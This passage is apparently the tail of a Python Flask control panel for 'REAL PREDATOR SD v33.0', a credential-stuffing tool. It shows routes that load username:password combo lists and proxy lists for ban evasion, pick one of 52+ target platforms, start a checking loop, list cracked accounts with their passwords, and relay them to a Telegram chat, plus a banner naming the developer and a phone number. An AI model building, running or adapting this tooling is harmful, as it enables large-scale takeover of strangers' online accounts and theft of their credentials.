            return `<div class="feed-item ${cls}"><span class="time">${item.time || ''}</span><span>${item.text || ''}</span></div>`;
        }).join('');
        document.getElementById('feedCount').textContent = '(' + d.feed.length + ')';
    } catch (e) { console.error('Feed update error:', e); }
}

async function updateResults() {
    try {
        const d = await api('/api/results');
        if (!d.success) return;
        const c = document.getElementById('resultContainer');
        if (!d.results || d.results.length === 0) {
            c.innerHTML = '<div class="empty-state">📭 No hits yet - Start hunting!</div>';
            return;
        }
        c.innerHTML = d.results.slice(0, 50).map(item => {
            const cls = item.is_gaming ? 'result-item hit gaming' : 'result-item hit';
            const badge = item.is_gaming ? '<span class="gaming-badge">🎮</span>' : '';
            return `<div class="${cls}">${badge}${item.content}</div>`;
        }).join('');
        document.getElementById('resultCount').textContent = '(' + d.results.length + ')';
    } catch (e) { console.error('Results update error:', e); }
}

setInterval(updateStats, 500);
setInterval(updateFeed, 600);
setInterval(updateResults, 700);

updateStats();
updateFeed();
updateResults();

document.querySelectorAll('.platform-badge').forEach(el => {
    el.addEventListener('click', function() {
        selectPlatform(this.dataset.platform);
    });
});

console.log('✅ Dashboard loaded - v33.0');
console.log('✅ ' + document.querySelectorAll('.platform-badge').length + ' platforms ready');
console.log('✅ Power Hunt enabled - Multi-strategy hunting');
</script>
</body>
</html>'''

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route('/')
def index():
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    password = request.json.get('password', '').strip()
    if password == ADMIN_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid password'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('index'))
    return render_template_string(DASHBOARD_TEMPLATE, platforms=PLATFORMS)

@app.route('/api/target', methods=['POST'])
def set_target():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    platform = request.json.get('platform', '')
    predator.set_target_platform(platform if platform else None)
    return jsonify({'success': True, 'target': platform or 'Random'})

@app.route('/api/tg_config', methods=['POST'])
def tg_config():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json
    predator.configure_telegram(data.get('token', ''), data.get('chat_id', ''))
    return jsonify({'success': True, 'enabled': predator.telegram_enabled})

@app.route('/api/start', methods=['POST'])
def start_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    if state['running']:
        return jsonify({'success': False, 'error': 'Already running'})
    
    data = request.json or {}
    
    if data.get('tg_token') and data.get('tg_chat_id'):
        predator.configure_telegram(data['tg_token'], data['tg_chat_id'])
    
    if data.get('target'):
        predator.set_target_platform(data['target'])
    
    state['running'] = True
    state['checked'] = 0
    state['hits'] = 0
    state['bad'] = 0
    state['errors'] = 0
    state['results'] = []
    state['feed'] = []
    state['current_testing'] = []
    state['start_time'] = datetime.now()
    state['cpm'] = 0
    
    threading.Thread(target=predator_loop, daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['running'] = False
    return jsonify({'success': True})

@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    gaming_hits = 0
    for result in state['results']:
        platform_name = result.get('platform', '')
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        if platform_info and platform_info.get('gaming'):
            gaming_hits += 1
    
    return jsonify({
        'success': True,
        'running': state['running'],
        'checked': state['checked'],
        'hits': state['hits'],
        'bad': state['bad'],
        'errors': state['errors'],
        'gaming': gaming_hits,
        'cpm': state.get('cpm', 0),
        'testing': len(state.get('current_testing', [])),
        'current_testing': state.get('current_testing', []),
        'start_time': int(state['start_time'].timestamp() * 1000) if state['start_time'] else None,
        'total': state.get('total', 1000)
    })

@app.route('/api/feed')
def get_feed():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state['feed'][:80]})

@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    formatted_results = []
    for result in state['results'][:50]:
        platform_name = result.get('platform', '')
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        is_gaming = platform_info.get('gaming', False) if platform_info else False
        
        formatted_results.append({
            'content': f"🎯 {platform_name} | 📧 {result.get('username', '')} | 🔑 {result.get('password', '')}",
            'is_gaming': is_gaming
        })
    
    return jsonify({'success': True, 'results': formatted_results})

@app.route('/api/clear', methods=['POST'])
def clear_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['results'] = []
    state['feed'] = []
    state['hits'] = 0
    state['bad'] = 0
    predator.results = []
    predator.feed = []
    predator.hits = 0
    predator.bad = 0
    return jsonify({'success': True})

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    content = request.json.get('content', '')
    combos = []
    
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            parts = line.split(':', 1)
            combos.append((parts[0].strip(), parts[1].strip()))
        elif '|' in line:
            parts = line.split('|', 1)
            combos.append((parts[0].strip(), parts[1].strip()))
        elif '@' in line:
            combos.append((line, ''))
        else:
            combos.append((line, ''))
    
    predator.add_combos(combos)
    return jsonify({'success': True, 'count': len(combos)})

@app.route('/api/upload/proxy', methods=['POST'])
def upload_proxy():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    proxies = [p.strip() for p in request.json.get('content', '').split('\n') if p.strip()]
    for proxy in proxies:
        predator.anti_ban.add_proxy(proxy)
    return jsonify({'success': True, 'count': len(proxies)})

# ================================================================
# RUN
# ================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 7080))
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║   REAL PREDATOR SD v33.0 - ULTIMATE HUNTER (COMPLETE)        ║
║   🔥 52+ PLATFORMS WITH COLORS                               ║
║   ⚡ ANTI-BAN + PROXY ROTATION                               ║
║   🎯 TARGET SPECIFIC PLATFORM OR RANDOM                      ║
║   📊 REAL-TIME STATS RECTANGLE                              ║
║   🚀 POWER HUNT - MULTI-STRATEGY HUNTING                   ║
║   📨 TELEGRAM INTEGRATION                                    ║
║   📱 DEVELOPER: @MRDPY                                       ║
║   💬 WhatsApp: +249907118667                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{port}")
    print(f"[*] Password: {ADMIN_PASSWORD}")
    print(f"[*] {len(PLATFORMS)} Platforms loaded")
    print(f"[*] Speed: 5 accounts/minute (100 in 20 min)")
    print(f"[*] Power Hunt: Multi-strategy hunting enabled")
    print(f"[*] All systems ready - Click START to hunt")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
